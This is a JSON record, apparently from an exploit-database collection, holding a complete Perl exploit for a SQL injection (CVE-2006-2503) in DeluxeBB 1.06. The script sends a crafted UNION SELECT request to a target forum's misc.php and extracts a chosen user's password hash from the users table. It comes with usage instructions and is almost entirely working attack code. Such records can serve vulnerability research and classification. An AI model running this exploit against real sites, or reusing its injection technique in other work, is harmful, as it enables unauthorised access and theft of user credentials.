{
  "id": "1793",
  "title": "DeluxeBB 1.06 - &#039;name&#039; SQL Injection (mq=off)",
  "cve": "CVE-2006-2503",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n\r\nuse IO::Socket;\r\n\r\n\r\nprint q{\r\n#############################################\r\n# DeluxeBB 1.06 Remote SQL Injection Exploit#\r\n# \texploit discovered and coded        #\r\n#\t   by KingOfSka                     #\r\n#\thttp://contropotere.netsons.org\t    #\r\n#############################################\r\n};\r\n\r\nif (!$ARGV[2]) {\r\n\r\nprint q{ \r\n\tUsage: perl dbbxpl.pl host /directory/ victim_userid \r\n  \r\n       perl dbbxpl.pl www.somesite.com /forum/ 1\r\n\r\n\r\n};\r\n\r\n}\r\n\r\n\r\n$server = $ARGV[0];\r\n$dir    = $ARGV[1];\r\n$user   = $ARGV[2];\r\n$myuser = $ARGV[3];\r\n$mypass = $ARGV[4];\r\n$myid   = $ARGV[5];\r\n\r\nprint \"------------------------------------------------------------------------------------------------\\r\\n\";\r\nprint \"[>] SERVER: $server\\r\\n\";\r\nprint \"[>]    DIR: $dir\\r\\n\";\r\nprint \"[>] USERID: $user\\r\\n\";\r\nprint \"------------------------------------------------------------------------------------------------\\r\\n\\r\\n\";\r\n\r\n$server =~ s/(http:\\/\\/)//eg;\r\n\r\n$path  = $dir;\r\n$path .= \"misc.php?sub=profile&name=0')+UNION+SELECT+0,pass,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0+FROM%20deluxebb_users%20WHERE%20(uid='\".$user ;\r\n\r\n \r\nprint \"[~] PREPARE TO CONNECT...\\r\\n\";\r\n\r\n$socket = IO::Socket::INET->new( Proto => \"tcp\", PeerAddr => \"$server\", PeerPort => \"80\") || die \"[-] CONNECTION FAILED\";\r\n\r\nprint \"[+] CONNECTED\\r\\n\";\r\nprint \"[~] SENDING QUERY...\\r\\n\";\r\nprint $socket \"GET $path HTTP/1.1\\r\\n\";\r\nprint $socket \"Host: $server\\r\\n\";\r\nprint $socket \"Accept: */*\\r\\n\";\r\nprint $socket \"Connection: close\\r\\n\\r\\n\";\r\nprint \"[+] DONE!\\r\\n\\r\\n\";\r\n\r\n\r\n\r\nprint \"--[ REPORT ]------------------------------------------------------------------------------------\\r\\n\";\r\nwhile ($answer = <$socket>)\r\n{\r\n\r\n if ($answer =~/(\\w{32})/)\r\n{\r\n\r\n  if ($1 ne 0) {\r\n   print \"Password Hash is: \".$1.\"\\r\\n\";\r\nprint \"--------------------------------------------------------------------------------------\\r\\n\";\r\n\r\n      }\r\nexit();\r\n}\r\n\r\n}\r\nprint \"------------------------------------------------------------------------------------------------\\r\\n\";\r\n\r\n# milw0rm.com [2006-05-15]",
  "url": "https://www.exploit-db.com/exploits/1793"
}